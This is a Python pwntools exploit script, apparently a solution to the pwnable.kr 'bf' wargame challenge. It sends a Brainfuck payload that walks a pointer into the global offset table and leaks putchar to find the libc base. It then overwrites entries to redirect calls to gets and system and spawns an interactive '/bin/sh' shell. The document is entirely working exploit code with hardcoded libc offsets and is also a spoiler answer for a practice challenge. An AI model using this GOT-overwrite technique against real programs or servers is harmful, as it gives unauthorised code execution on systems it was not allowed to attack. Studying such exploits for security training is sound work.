import sys
from pwn import *

context(arch = 'i386', log_level = 'info')
if sys.argv[1] == 'l':
	r = process('./bf')
	gets = 0x0061920
	system = 0x0003aea0
	putchar = 0x00063e70

else:
	r = remote('pwnable.kr', 9001)
	gets = 0x00066e50
	system = 0x0003f250
	putchar = 0x00068770


main =  0x8048671
print r.recvuntil(']')
payload = ''
payload += '<'*112
payload += '.'
#getchar leak
payload += '.'
payload += '>'
payload += '.'
payload += '>'
payload += '.'
payload += '>'
payload += '.'
#getchar
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
#memset 
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
#fgets
payload += '<'*0x19
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','

#main
payload += '.'
r.sendline(payload)
sleep(1)
if sys.argv[1] == 'l':
	data = r.recv(2)
	data = r.recv(4)
else:
	data = r.recv(1)
	data = r.recv(1024)[1:]
print data
libc = u32(data) - putchar
print 'libc base:', hex(libc)
system += libc
gets += libc
print 'system:', hex(system)
print 'gets:', hex(gets)
payload  = p32(main)[::-1]
payload += p32(gets)[::-1]
payload += p32(system)[::-1]
payload += '/bin/sh'
r.sendline(payload)


r.interactive()
